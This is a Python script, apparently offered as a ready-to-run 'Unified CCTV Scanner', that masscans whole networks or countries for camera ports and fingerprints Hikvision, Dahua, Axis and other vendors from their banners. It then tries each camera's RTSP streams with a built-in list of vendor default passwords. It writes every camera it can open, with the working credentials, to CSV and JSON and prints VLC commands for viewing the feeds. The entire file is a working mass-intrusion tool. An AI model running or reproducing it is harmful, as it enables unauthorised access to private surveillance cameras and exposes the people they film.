#!/usr/bin/env python3
"""
Unified CCTV Scanner - Complete workflow for discovering accessible cameras
Optimized for country-level scanning (millions of IPs)

Workflow:
  1. Masscan discovery (find open camera ports)
  2. Banner grabbing + fingerprinting (identify vendors/models)
  3. RTSP detection
  4. Stream verification with ffmpeg
  5. Output accessible cameras with credentials

Author: vortex
"""

import argparse
import subprocess
import json
import socket
import concurrent.futures
import time
import re
import sys
import shlex
import csv
from pathlib import Path
from typing import Dict, List, Tuple, Optional
from dataclasses import dataclass, asdict
from datetime import datetime
import tempfile
import os
import signal
import threading

# ============================================================================
# VENDOR SIGNATURES DATABASE
# ============================================================================

VENDOR_SIGNATURES = {
    # Hikvision
    'hikvision': {
        'http_headers': ['Server: App-webs/', 'Server: uc-httpd', 'realm="DS-', 'realm="IP CAMERA"'],
        'http_body': ['DVR Login', '/doc/page/login.asp', 'g_szDeviceType', 'hikvision'],
        'rtsp_banner': ['RTSP/1.0 401', 'realm="HikvisionDS'],
        'default_ports': [80, 8000, 554, 8080],
        'default_paths': ['/Streaming/Channels/101', '/Streaming/Channels/1', '/h264/ch1/main/av_stream'],
        'auth': [('admin', 'admin'), ('admin', '12345'), ('admin', '')]
    },

    # Dahua
    'dahua': {
        'http_headers': ['Server: Webs', 'realm="DH-', 'DhWebServer'],
        'http_body': ['DhWebClientDemo', '/RPC2_Login', 'dahua', 'dhtmlx'],
        'rtsp_banner': ['realm="DH-'],
        'default_ports': [80, 37777, 554],
        'default_paths': ['/cam/realmonitor?channel=1&subtype=0', '/cam/realmonitor?channel=1&subtype=1'],
        'auth': [('admin', 'admin'), ('admin', ''), ('888888', '888888')]
    },

    # Axis
    'axis': {
        'http_headers': ['Server: AXIS', 'realm="AXIS'],
        'http_body': ['AXIS', '/operator/basic.shtml'],
        'rtsp_banner': ['AXIS'],
        'default_ports': [80, 554],
        'default_paths': ['/axis-media/media.amp', '/mjpg/video.mjpg'],
        'auth': [('root', 'pass'), ('root', 'root'), ('admin', 'admin')]
    },

    # Uniview (UNV)
    'uniview': {
        'http_headers': ['Server: ipc'],
        'http_body': ['unv_login', 'uniview'],
        'rtsp_banner': [],
        'default_ports': [80, 554, 8000],
        'default_paths': ['/media/video1', '/ch0'],
        'auth': [('admin', '123456'), ('admin', 'admin')]
    },

    # Foscam
    'foscam': {
        'http_headers': ['Server: Foscam'],
        'http_body': ['Foscam', 'CGIProxy.fcgi'],
        'rtsp_banner': [],
        'default_ports': [80, 88, 554],
        'default_paths': ['/videoMain', '/video.cgi'],
        'auth': [('admin', ''), ('admin', 'admin')]
    },

    # TP-Link / Tapo
    'tplink': {
        'http_headers': ['Server: TP-LINK'],
        'http_body': ['TP-LINK', 'tpCamera'],
        'rtsp_banner': [],
        'default_ports': [554, 2020],
        'default_paths': ['/stream1', '/stream2'],
        'auth': [('admin', 'admin')]
    },

    # Vivotek
    'vivotek': {
        'http_headers': ['Server: Vivotek'],
        'http_body': ['VIVOTEK'],
        'rtsp_banner': ['VIVOTEK'],
        'default_ports': [80, 554],
        'default_paths': ['/live.sdp', '/stream1'],
        'auth': [('root', ''), ('admin', 'admin')]
    },

    # Hanwha (Samsung)
    'hanwha': {
        'http_headers': ['realm="iPOLiS"'],
        'http_body': ['SunapiWeb', 'iPOLiS'],
        'rtsp_banner': [],
        'default_ports': [80, 554],
        'default_paths': ['/profile1/media.smp', '/onvif-media/media.amp'],
        'auth': [('admin', '4321'), ('admin', 'admin')]
    },

    # Amcrest
    'amcrest': {
        'http_headers': ['Server: Webs', 'realm="IP Camera"'],
        'http_body': ['Amcrest', '/RPC2_Login'],
        'rtsp_banner': [],
        'default_ports': [80, 554, 37777],
        'default_paths': ['/cam/realmonitor?channel=1&subtype=0'],
        'auth': [('admin', 'admin'), ('admin', '')]
    },

    # Reolink
    'reolink': {
        'http_headers': ['Server: Reolink'],
        'http_body': ['Reolink', 'reolink'],
        'rtsp_banner': [],
        'default_ports': [80, 554, 9000],
        'default_paths': ['/h264Preview_01_main', '/h264Preview_01_sub'],
        'auth': [('admin', ''), ('admin', 'admin')]
    },

    # Generic / Unknown
    'generic': {
        'http_headers': [],
        'http_body': ['IP Camera', 'Network Camera', 'Web Client'],
        'rtsp_banner': ['RTSP/1.0'],
        'default_ports': [554, 80, 8080, 8554],
        'default_paths': ['/', '/live.sdp', '/stream1', '/videoMain', '/ch0'],
        'auth': [('admin', 'admin'), ('admin', ''), ('admin', '12345'), ('root', '')]
    }
}

# Additional common RTSP paths
COMMON_RTSP_PATHS = [
    '/',
    '/live.sdp',
    '/stream1',
    '/stream2',
    '/videoMain',
    '/ch0',
    '/ch1',
    '/h264',
    '/mpeg4',
    '/media.amp',
    '/onvif1',
    '/11',
    '/12'
]

# Camera-related ports
CAMERA_PORTS = "21,80-88,554-555,1935,5000-5001,8000-8090,8443,8554-8555,8888,10554,37777,34567,49152"

# ============================================================================
# DATA CLASSES
# ============================================================================

@dataclass
class CameraInfo:
    ip: str
    port: int
    vendor: str = "unknown"
    model: str = "unknown"
    version: str = "unknown"
    rtsp_url: str = ""
    http_url: str = ""
    status: str = "discovered"  # discovered, identified, accessible, unauthorized, no_response
    credentials: str = ""
    banner: str = ""
    server_header: str = ""

    def to_dict(self):
        return asdict(self)

# ============================================================================
# UTILITY FUNCTIONS
# ============================================================================

class Colors:
    RED = '\033[0;31m'
    GREEN = '\033[0;32m'
    YELLOW = '\033[1;33m'
    BLUE = '\033[0;34m'
    CYAN = '\033[0;36m'
    MAGENTA = '\033[0;35m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

def log_info(msg):
    print(f"{Colors.CYAN}[INFO]{Colors.RESET} {msg}")

def log_success(msg):
    print(f"{Colors.GREEN}[✓]{Colors.RESET} {msg}")

def log_warn(msg):
    print(f"{Colors.YELLOW}[!]{Colors.RESET} {msg}")

def log_error(msg):
    print(f"{Colors.RED}[✗]{Colors.RESET} {msg}", file=sys.stderr)

def log_found(msg):
    print(f"{Colors.MAGENTA}[★]{Colors.RESET} {msg}")

def print_banner():
    banner = f"""
{Colors.CYAN}╔════════════════════════════════════════════════════════════╗
║                                                            ║
║           🎥  Unified CCTV Scanner v2.0  🎥               ║
║                                                            ║
║     Masscan → Banner Grab → RTSP → FFmpeg Verify         ║
║                                                            ║
╚════════════════════════════════════════════════════════════╝{Colors.RESET}
    """
    print(banner)


# ============================================================================
# CHECKPOINT / RESUME HELPERS
# ============================================================================

CHECKPOINT_LOCK = threading.Lock()
CHECKPOINT_STATE = {}

def save_checkpoint_file(path: str, state: Dict):
    try:
        with CHECKPOINT_LOCK:
            with open(path, 'w') as f:
                json.dump(state, f, indent=2)
        log_info(f"Checkpoint saved to: {path}")
    except Exception as e:
        log_error(f"Failed to save checkpoint: {e}")

def load_checkpoint_file(path: str) -> Optional[Dict]:
    try:
        if not os.path.exists(path):
            return None
        with open(path, 'r') as f:
            return json.load(f)
    except Exception as e:
        log_error(f"Failed to load checkpoint: {e}")
        return None

def remove_checkpoint_file(path: str):
    try:
        if os.path.exists(path):
            os.unlink(path)
            log_info(f"Removed checkpoint file: {path}")
    except Exception as e:
        log_error(f"Failed to remove checkpoint file: {e}")


# ============================================================================
# STAGE 1: MASSCAN DISCOVERY
# ============================================================================

def run_masscan(targets: str, ports: str, rate: int, output_file: str, exclude_file: Optional[str] = None) -> bool:
    """Run masscan for fast port discovery"""
    log_info(f"Starting masscan discovery...")
    log_info(f"Targets: {targets}")
    log_info(f"Ports: {ports}")
    log_info(f"Rate: {rate} pps")

    cmd = [
        "masscan", targets,
        "-p", ports,
        "--rate", str(rate),
        "--wait", "10",
        "--open-only",
        "-oL", output_file
    ]

    if exclude_file:
        cmd.extend(['--excludefile', exclude_file])

    try:
        log_info(f"Command: {' '.join(cmd)}")
        log_info("Running masscan (this may take a while)...")

        # Run masscan without capturing output so user sees progress
        result = subprocess.run(cmd, text=True)

        if result.returncode != 0:
            log_error(f"Masscan failed with return code: {result.returncode}")
            return False

        log_success("Masscan completed")
        return True

    except FileNotFoundError:
        log_error("Masscan not found. Install with: apt-get install masscan")
        return False
    except Exception as e:
        log_error(f"Masscan error: {e}")
        return False

def parse_masscan_output(output_file: str) -> List[Tuple[str, int]]:
    """Parse masscan output to get IP:Port pairs"""
    targets = []

    try:
        with open(output_file, 'r') as f:
            lines = f.readlines()
            log_info(f"Masscan output file has {len(lines)} lines")

            for line in lines:
                if line.startswith('open'):
                    parts = line.split()
                    if len(parts) >= 4:
                        port = int(parts[2])
                        ip = parts[3]
                        targets.append((ip, port))
                elif line.startswith('#') or line.strip() == '':
                    continue  # Skip comments and empty lines
                else:
                    log_warn(f"Unexpected line in masscan output: {line.strip()[:100]}")

        log_success(f"Parsed {len(targets)} targets from masscan")

        # If no targets found, show first few lines of output for debugging
        if len(targets) == 0 and len(lines) > 0:
            log_warn(f"No 'open' lines found. First few lines of output:")
            for i, line in enumerate(lines[:5]):
                log_info(f"  Line {i+1}: {line.strip()}")

        return targets

    except Exception as e:
        log_error(f"Error parsing masscan output: {e}")
        return []

# ============================================================================
# STAGE 2: BANNER GRABBING & FINGERPRINTING
# ============================================================================

def grab_http_banner(ip: str, port: int, timeout: int = 5) -> Dict:
    """Grab HTTP banner and identify vendor"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((ip, port))

        # Send HTTP request
        request = f"GET / HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: Mozilla/5.0\r\n\r\n"
        sock.sendall(request.encode())

        # Receive response
        response = b""
        while True:
            try:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                response += chunk
                if b'\r\n\r\n' in response and len(response) > 500:
                    break
            except socket.timeout:
                break

        sock.close()

        response_str = response.decode('utf-8', errors='ignore')

        # Extract headers and body
        if '\r\n\r\n' in response_str:
            headers, body = response_str.split('\r\n\r\n', 1)
        else:
            headers = response_str
            body = ""

        return {
            'success': True,
            'headers': headers.lower(),
            'body': body.lower(),
            'raw': response_str[:1000]
        }

    except Exception as e:
        return {'success': False, 'error': str(e)}

def grab_rtsp_banner(ip: str, port: int, timeout: int = 5) -> Dict:
    """Grab RTSP banner"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((ip, port))

        # Send RTSP OPTIONS request
        request = f"OPTIONS rtsp://{ip}:{port}/ RTSP/1.0\r\nCSeq: 1\r\n\r\n"
        sock.sendall(request.encode())

        # Receive response
        response = sock.recv(4096).decode('utf-8', errors='ignore')
        sock.close()

        return {
            'success': True,
            'banner': response.lower(),
            'raw': response[:500]
        }

    except Exception as e:
        return {'success': False, 'error': str(e)}

def identify_vendor(http_data: Dict, rtsp_data: Dict) -> Tuple[str, str, str]:
    """Identify vendor, model, and version from banners"""

    http_headers = http_data.get('headers', '') if http_data.get('success') else ''
    http_body = http_data.get('body', '') if http_data.get('success') else ''
    rtsp_banner = rtsp_data.get('banner', '') if rtsp_data.get('success') else ''

    # Check each vendor signature
    for vendor, sigs in VENDOR_SIGNATURES.items():
        if vendor == 'generic':
            continue

        # Check HTTP headers
        for header_sig in sigs['http_headers']:
            if header_sig.lower() in http_headers:
                model = extract_model(http_headers, http_body, vendor)
                version = extract_version(http_headers, http_body, vendor)
                return vendor, model, version

        # Check HTTP body
        for body_sig in sigs['http_body']:
            if body_sig.lower() in http_body:
                model = extract_model(http_headers, http_body, vendor)
                version = extract_version(http_headers, http_body, vendor)
                return vendor, model, version

        # Check RTSP banner
        for rtsp_sig in sigs['rtsp_banner']:
            if rtsp_sig.lower() in rtsp_banner:
                model = extract_model(rtsp_banner, '', vendor)
                version = extract_version(rtsp_banner, '', vendor)
                return vendor, model, version

    return 'unknown', 'unknown', 'unknown'

def extract_model(headers: str, body: str, vendor: str) -> str:
    """Extract model information"""
    text = headers + ' ' + body

    # Vendor-specific model patterns
    patterns = {
        'hikvision': [r'DS-[\w-]+', r'iVMS-[\d]+'],
        'dahua': [r'DH-[\w-]+', r'IPC-[\w-]+'],
        'axis': [r'AXIS [A-Z0-9]+'],
        'uniview': [r'IPC[\w-]+'],
        'foscam': [r'FI[\d]+[A-Z]*'],
    }

    if vendor in patterns:
        for pattern in patterns[vendor]:
            match = re.search(pattern, text, re.IGNORECASE)
            if match:
                return match.group(0)

    return 'unknown'

def extract_version(headers: str, body: str, vendor: str) -> str:
    """Extract version/firmware information"""
    text = headers + ' ' + body

    # Common version patterns
    patterns = [
        r'version[:\s]+([0-9.]+)',
        r'firmware[:\s]+([0-9.]+)',
        r'v([0-9.]+)',
        r'ver[:\s]+([0-9.]+)',
    ]

    for pattern in patterns:
        match = re.search(pattern, text, re.IGNORECASE)
        if match:
            return match.group(1)

    return 'unknown'

def process_target(target: Tuple[str, int], timeout: int) -> Optional[CameraInfo]:
    """Process a single target - banner grab and identify"""
    ip, port = target

    try:
        camera = CameraInfo(ip=ip, port=port)

        # Determine protocol based on port
        is_http_port = port in [80, 81, 82, 83, 84, 85, 86, 87, 88, 8000, 8080, 8081, 8443, 8888, 10080]
        is_rtsp_port = port in [554, 555, 8554, 8555, 10554]

        http_data = {}
        rtsp_data = {}

        # Grab banners
        if is_http_port:
            http_data = grab_http_banner(ip, port, timeout)
            if http_data.get('success'):
                camera.http_url = f"http://{ip}:{port}"
                camera.server_header = http_data.get('headers', '').split('\r\n')[0]

        if is_rtsp_port:
            rtsp_data = grab_rtsp_banner(ip, port, timeout)
            if rtsp_data.get('success'):
                camera.banner = rtsp_data.get('raw', '')[:100]

        # If HTTP port but no response, try RTSP
        if is_http_port and not http_data.get('success'):
            rtsp_data = grab_rtsp_banner(ip, port, timeout)

        # Identify vendor
        if http_data.get('success') or rtsp_data.get('success'):
            vendor, model, version = identify_vendor(http_data, rtsp_data)
            camera.vendor = vendor
            camera.model = model
            camera.version = version
            camera.status = 'identified'

            return camera

        return None

    except Exception as e:
        return None

# ============================================================================
# STAGE 3: STREAM VERIFICATION
# ============================================================================

def test_rtsp_stream(url: str, timeout: int = 8) -> Tuple[str, str]:
    """Test RTSP stream using ffmpeg"""
    cmd = f"ffmpeg -rtsp_transport tcp -i {shlex.quote(url)} -t 1 -f null -"

    try:
        proc = subprocess.run(
            shlex.split(cmd),
            capture_output=True,
            text=True,
            timeout=timeout
        )

        stderr = (proc.stderr or "").lower()

        if "401 unauthorized" in stderr or "authorization failed" in stderr:
            return ("unauthorized", "Requires authentication")

        if any(x in stderr for x in ["connection refused", "no route to host", "timed out", "connection reset"]):
            return ("no_response", "Connection failed")

        if "input #0" in stderr or "stream #0" in stderr or proc.returncode == 0:
            return ("authorized", "Stream accessible!")

        return ("no_response", "Unknown error")

    except subprocess.TimeoutExpired:
        return ("no_response", f"Timeout after {timeout}s")
    except FileNotFoundError:
        return ("error", "ffmpeg not found")
    except Exception as e:
        return ("error", str(e))

def build_rtsp_urls(camera: CameraInfo) -> List[str]:
    """Build RTSP URLs to test based on vendor"""
    urls = []

    # Get vendor-specific paths
    vendor_paths = []
    if camera.vendor in VENDOR_SIGNATURES:
        vendor_paths = VENDOR_SIGNATURES[camera.vendor]['default_paths']

    # Always test RTSP port 554 first
    rtsp_ports = [554]

    # Add camera's actual port if different
    if camera.port not in rtsp_ports:
        rtsp_ports.append(camera.port)

    # Add common RTSP ports
    for port in [8554, 555]:
        if port not in rtsp_ports:
            rtsp_ports.append(port)

    # Build URLs
    for port in rtsp_ports:
        # Try vendor-specific paths first
        for path in vendor_paths:
            urls.append(f"rtsp://{camera.ip}:{port}{path}")

        # Then try common paths
        for path in COMMON_RTSP_PATHS[:5]:  # Limit to avoid too many tests
            url = f"rtsp://{camera.ip}:{port}{path}"
            if url not in urls:
                urls.append(url)

    return urls[:10]  # Limit to 10 URLs per camera

def test_camera_with_auth(camera: CameraInfo, timeout: int = 8) -> Optional[CameraInfo]:
    """Test camera streams with authentication"""

    # Build URLs to test
    urls = build_rtsp_urls(camera)

    # Test without auth first
    for url in urls:
        status, msg = test_rtsp_stream(url, timeout)

        if status == "authorized":
            camera.rtsp_url = url
            camera.status = "authorized"
            return camera

        # If unauthorized, try default credentials
        if status == "unauthorized":
            # Get vendor-specific credentials
            auth_list = []
            if camera.vendor in VENDOR_SIGNATURES:
                auth_list = VENDOR_SIGNATURES[camera.vendor]['auth']
            else:
                auth_list = VENDOR_SIGNATURES['generic']['auth']

            for username, password in auth_list:
                if password:
                    auth_url = url.replace('rtsp://', f'rtsp://{username}:{password}@')
                else:
                    auth_url = url.replace('rtsp://', f'rtsp://{username}@')

                status, msg = test_rtsp_stream(auth_url, timeout)

                if status == "authorized":
                    camera.rtsp_url = auth_url
                    camera.status = "authorized"
                    camera.credentials = f"{username}:{password}" if password else username
                    return camera

    # No accessible stream found
    camera.status = "no_response"
    return camera

# ============================================================================
# MAIN WORKFLOW
# ============================================================================

def main():
    parser = argparse.ArgumentParser(
        description="Unified CCTV Scanner - Complete discovery to verification",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Scan single network
  sudo python3 unified-cctv-scanner.py -t 192.168.1.0/24

  # Scan from file with high speed
  sudo python3 unified-cctv-scanner.py -f targets.txt -r 50000 -w 50

  # Quick scan with default settings
  sudo python3 unified-cctv-scanner.py -t 10.0.0.0/16

Output files:
  - accessible-cameras.csv  (Final results)
  - accessible-cameras.json (Detailed JSON)
  - all-cameras.json        (All identified cameras)
        """
    )

    # Input options
    parser.add_argument('-t', '--target', help='Single CIDR target (e.g., 192.168.0.0/16)')
    parser.add_argument('-f', '--file', help='File with CIDR blocks (one per line)')
    parser.add_argument('-i', '--input-json', help='Skip masscan, use existing JSON from previous scan')

    # Masscan options
    parser.add_argument('-p', '--ports', default=CAMERA_PORTS, help=f'Ports to scan (default: {CAMERA_PORTS})')
    parser.add_argument('-r', '--rate', type=int, default=10000, help='Masscan rate in pps (default: 10000)')
    parser.add_argument('-e', '--exclude', help='File with IPs/CIDRs to exclude')

    # Processing options
    parser.add_argument('-w', '--workers', type=int, default=20, help='Parallel workers for banner grabbing (default: 20)')
    parser.add_argument('--timeout', type=int, default=5, help='Connection timeout in seconds (default: 5)')
    parser.add_argument('--ffmpeg-timeout', type=int, default=8, help='FFmpeg timeout for stream testing (default: 8)')

    # Output options
    parser.add_argument('-o', '--output', default='accessible-cameras', help='Output file prefix (default: accessible-cameras)')
    parser.add_argument('--skip-verification', action='store_true', help='Skip ffmpeg stream verification')

    # Misc options
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')

    args = parser.parse_args()

    print_banner()

    # Validate inputs
    if not args.input_json:
        if not args.target and not args.file:
            log_error("Either --target, --file, or --input-json is required")
            parser.print_help()
            sys.exit(1)

        # Check if running as root (needed for masscan)
        if os.geteuid() != 0:
            log_error("Masscan requires root privileges. Run with sudo.")
            sys.exit(1)

    # Check dependencies
    if not args.input_json:
        if subprocess.run(['which', 'masscan'], capture_output=True).returncode != 0:
            log_error("Masscan not found. Install with: apt-get install masscan")
            sys.exit(1)

    if not args.skip_verification:
        if subprocess.run(['which', 'ffmpeg'], capture_output=True).returncode != 0:
            log_warn("FFmpeg not found. Stream verification will be skipped.")
            args.skip_verification = True

    start_time = time.time()
    # Checkpoint filename
    checkpoint_file = f"{args.output}.checkpoint.json"

    # Signal handler to save checkpoint on Ctrl+C
    def _handle_sigint(signum, frame):
        log_warn("SIGINT received, saving checkpoint...")
        try:
            save_checkpoint_file(checkpoint_file, CHECKPOINT_STATE)
        except Exception:
            pass
        sys.exit(0)

    signal.signal(signal.SIGINT, _handle_sigint)

    # Try to load existing checkpoint (auto-resume)
    ckpt = load_checkpoint_file(checkpoint_file)
    if ckpt:
        log_warn(f"Found checkpoint file: {checkpoint_file}. Resuming...")
        # If masscan completed and we're in stage2
        if ckpt.get('stage') == 'stage2':
            discovered = [tuple(t) for t in ckpt.get('discovered', [])]
            cameras = [CameraInfo(**c) for c in ckpt.get('cameras', [])]
            processed_indices = set(ckpt.get('processed_indices', []))
            CHECKPOINT_STATE.update(ckpt)
            log_info(f"Resuming Stage 2: {len(discovered)} targets, {len(cameras)} already identified")
        elif ckpt.get('stage') == 'stage3':
            cameras = [CameraInfo(**c) for c in ckpt.get('cameras', [])]
            accessible = [CameraInfo(**c) for c in ckpt.get('accessible', [])]
            tested_indices = set(ckpt.get('tested_indices', []))
            CHECKPOINT_STATE.update(ckpt)
            log_info(f"Resuming Stage 3: {len(cameras)} cameras, {len(accessible)} already tested")
        else:
            # Unknown stage - ignore
            log_info("Unknown checkpoint stage, starting fresh")

    # ========================================================================
    # STAGE 1: MASSCAN DISCOVERY (if not using existing JSON)
    # ========================================================================

    if args.input_json:
        log_info(f"Loading existing scan results from: {args.input_json}")
        try:
            with open(args.input_json, 'r') as f:
                data = json.load(f)
                cameras = [CameraInfo(**cam) for cam in data.get('cameras', [])]
            log_success(f"Loaded {len(cameras)} cameras from previous scan")
        except Exception as e:
            log_error(f"Failed to load JSON: {e}")
            sys.exit(1)
    else:
        # Prepare target string
        if args.target:
            targets = args.target
        else:
            # Read from file
            with open(args.file, 'r') as f:
                targets = ','.join([line.strip() for line in f if line.strip() and not line.startswith('#')])

        log_info(f"Stage 1: Port Discovery")
        log_info("=" * 60)

        masscan_output = tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.txt')
        masscan_output.close()

        success = run_masscan(targets, args.ports, args.rate, masscan_output.name, args.exclude)

        if not success:
            log_error("Masscan failed")
            sys.exit(1)

        # Parse masscan results
        discovered = parse_masscan_output(masscan_output.name)
        os.unlink(masscan_output.name)

        if not discovered:
            log_warn("No open ports found")
            sys.exit(0)

        log_success(f"Discovered {len(discovered)} open ports")
        print()
        # Save initial checkpoint for Stage 2 (so we can resume banner grabbing)
        try:
            ck = {
                'stage': 'stage2',
                'discovered': [[t[0], t[1]] for t in discovered],
                'processed_indices': [],
                'cameras': []
            }
            CHECKPOINT_STATE.update(ck)
            save_checkpoint_file(checkpoint_file, CHECKPOINT_STATE)
        except Exception:
            pass

        # ====================================================================
        # STAGE 2: BANNER GRABBING & IDENTIFICATION
        # ====================================================================

        log_info(f"Stage 2: Banner Grabbing & Fingerprinting")
        log_info("=" * 60)
        log_info(f"Processing {len(discovered)} targets with {args.workers} workers...")

        # Banner grabbing with checkpointing
        cameras = []
        processed = 0
        processed_indices = set()

        # If we resumed from checkpoint and some cameras exist, initialize
        if isinstance(CHECKPOINT_STATE.get('cameras'), list) and CHECKPOINT_STATE.get('cameras'):
            cameras = [CameraInfo(**c) for c in CHECKPOINT_STATE.get('cameras', [])]
            processed_indices = set(CHECKPOINT_STATE.get('processed_indices', []))

        # Build list of remaining targets (preserve original ordering)
        remaining = []
        for idx, tgt in enumerate(discovered):
            if idx in processed_indices:
                continue
            remaining.append((idx, tgt))

        if remaining:
            with concurrent.futures.ThreadPoolExecutor(max_workers=args.workers) as executor:
                future_to_idx = {executor.submit(process_target, tgt, args.timeout): idx for idx, tgt in remaining}

                for future in concurrent.futures.as_completed(future_to_idx):
                    idx = future_to_idx[future]
                    processed += 1
                    try:
                        result = future.result()
                        if result:
                            cameras.append(result)
                            if args.verbose:
                                log_success(f"Identified: {result.ip}:{result.port} - {result.vendor} {result.model}")
                    except Exception as e:
                        if args.verbose:
                            log_error(f"Error processing target idx {idx} - {e}")

                    # mark as processed and update checkpoint state
                    processed_indices.add(idx)
                    CHECKPOINT_STATE.update({
                        'stage': 'stage2',
                        'discovered': [[t[0], t[1]] for t in discovered],
                        'processed_indices': sorted(list(processed_indices)),
                        'cameras': [c.to_dict() for c in cameras]
                    })

                    # Periodically persist checkpoint
                    if processed % 200 == 0:
                        save_checkpoint_file(checkpoint_file, CHECKPOINT_STATE)

                    # Progress
                    if processed % 100 == 0 or len(processed_indices) == len(discovered):
                        pct = (len(processed_indices) / len(discovered)) * 100
                        print(f"\rProgress: {len(processed_indices)}/{len(discovered)} ({pct:.1f}%) - Found: {len(cameras)} cameras", end='', flush=True)

            # final save after completing remaining
            save_checkpoint_file(checkpoint_file, CHECKPOINT_STATE)
        else:
            log_info("No remaining targets to process (resumed or nothing to do)")

        print()  # New line after progress
        log_success(f"Identified {len(cameras)} potential cameras")

        # Save intermediate results
        intermediate_file = f"{args.output}-all.json"
        with open(intermediate_file, 'w') as f:
            json.dump({
                'scan_date': datetime.now().isoformat(),
                'total_scanned': len(discovered),
                'cameras_identified': len(cameras),
                'cameras': [cam.to_dict() for cam in cameras]
            }, f, indent=2)
        log_info(f"Intermediate results saved to: {intermediate_file}")
        print()

    # ========================================================================
    # STAGE 3: STREAM VERIFICATION
    # ========================================================================

    if args.skip_verification:
        log_warn("Stream verification skipped")
        accessible = cameras
    else:
        log_info(f"Stage 3: Stream Verification with FFmpeg")
        log_info("=" * 60)
        log_info(f"Testing {len(cameras)} cameras for accessible streams...")
        accessible = []
        tested = 0
        tested_indices = set()

        # If resuming from checkpoint, initialize
        if CHECKPOINT_STATE.get('stage') == 'stage3' and isinstance(CHECKPOINT_STATE.get('accessible'), list):
            accessible = [CameraInfo(**c) for c in CHECKPOINT_STATE.get('accessible', [])]
            tested_indices = set(CHECKPOINT_STATE.get('tested_indices', []))

        # Build list of remaining camera indices to test
        remaining = []
        for idx, cam in enumerate(cameras):
            if idx in tested_indices:
                continue
            remaining.append((idx, cam))

        if remaining:
            with concurrent.futures.ThreadPoolExecutor(max_workers=args.workers) as executor:
                future_to_idx = {executor.submit(test_camera_with_auth, cam, args.ffmpeg_timeout): idx for idx, cam in remaining}

                for future in concurrent.futures.as_completed(future_to_idx):
                    idx = future_to_idx[future]
                    tested += 1

                    try:
                        result = future.result()
                        if result and result.status == "authorized":
                            accessible.append(result)
                            creds_str = f" [{result.credentials}]" if result.credentials else ""
                            log_found(f"{result.ip}:{result.port} - {result.vendor} {result.model}{creds_str}")
                    except Exception as e:
                        if args.verbose:
                            log_error(f"Stream test error: {e}")

                    # mark as tested and update checkpoint
                    tested_indices.add(idx)
                    CHECKPOINT_STATE.update({
                        'stage': 'stage3',
                        'cameras': [c.to_dict() for c in cameras],
                        'accessible': [c.to_dict() for c in accessible],
                        'tested_indices': sorted(list(tested_indices))
                    })

                    if tested % 50 == 0:
                        save_checkpoint_file(checkpoint_file, CHECKPOINT_STATE)

                    # Progress
                    if tested % 50 == 0 or len(tested_indices) == len(cameras):
                        pct = (len(tested_indices) / len(cameras)) * 100
                        print(f"\rProgress: {len(tested_indices)}/{len(cameras)} ({pct:.1f}%) - Accessible: {len(accessible)}", end='', flush=True)

            # final save
            save_checkpoint_file(checkpoint_file, CHECKPOINT_STATE)
        else:
            log_info("No remaining cameras to test (resumed or nothing to do)")

        print()  # New line
        log_success(f"Found {len(accessible)} accessible cameras!")

    # ========================================================================
    # SAVE RESULTS
    # ========================================================================

    end_time = time.time()
    duration = int(end_time - start_time)

    print()
    log_info("Saving results...")

    # Save JSON
    json_file = f"{args.output}.json"
    with open(json_file, 'w') as f:
        json.dump({
            'scan_metadata': {
                'scan_date': datetime.now().isoformat(),
                'duration_seconds': duration,
                'total_cameras_tested': len(cameras),
                'accessible_cameras': len(accessible)
            },
            'cameras': [cam.to_dict() for cam in accessible]
        }, f, indent=2)

    # Save CSV
    csv_file = f"{args.output}.csv"
    with open(csv_file, 'w', newline='') as f:
        writer = csv.writer(f)
        writer.writerow(['IP', 'Port', 'Vendor', 'Model', 'Version', 'RTSP_URL', 'Credentials', 'Status'])

        for cam in accessible:
            writer.writerow([
                cam.ip,
                cam.port,
                cam.vendor,
                cam.model,
                cam.version,
                cam.rtsp_url,
                cam.credentials,
                cam.status
            ])

    # Remove checkpoint on successful completion
    try:
        remove_checkpoint_file(checkpoint_file)
    except Exception:
        pass

    # ========================================================================
    # SUMMARY
    # ========================================================================

    print()
    print(f"{Colors.GREEN}{'=' * 60}{Colors.RESET}")
    print(f"{Colors.GREEN}SCAN COMPLETE - SUMMARY{Colors.RESET}")
    print(f"{Colors.GREEN}{'=' * 60}{Colors.RESET}")
    print()
    print(f"  {Colors.CYAN}Duration:{Colors.RESET}              {duration}s ({duration // 60}m {duration % 60}s)")
    print(f"  {Colors.CYAN}Cameras Identified:{Colors.RESET}   {len(cameras)}")
    print(f"  {Colors.MAGENTA}Accessible Cameras:{Colors.RESET}  {len(accessible)}{Colors.RESET}")
    print()

    if accessible:
        print(f"{Colors.YELLOW}Vendor Breakdown:{Colors.RESET}")
        vendor_counts = {}
        for cam in accessible:
            vendor_counts[cam.vendor] = vendor_counts.get(cam.vendor, 0) + 1

        for vendor, count in sorted(vendor_counts.items(), key=lambda x: x[1], reverse=True):
            print(f"  {Colors.MAGENTA}{vendor}:{Colors.RESET} {count}")
        print()

    print(f"{Colors.CYAN}Output Files:{Colors.RESET}")
    print(f"  • {Colors.GREEN}{json_file}{Colors.RESET} (detailed JSON)")
    print(f"  • {Colors.GREEN}{csv_file}{Colors.RESET} (CSV for import)")
    print()

    if accessible:
        print(f"{Colors.YELLOW}Quick Access:{Colors.RESET}")
        print(f"  # View all URLs")
        print(f"  {Colors.GREEN}cat {csv_file} | cut -d',' -f6{Colors.RESET}")
        print()
        print(f"  # Test with VLC")
        print(f"  {Colors.GREEN}vlc $(head -2 {csv_file} | tail -1 | cut -d',' -f6){Colors.RESET}")
        print()

    print(f"{Colors.GREEN}{'=' * 60}{Colors.RESET}")

if __name__ == "__main__":
    main()
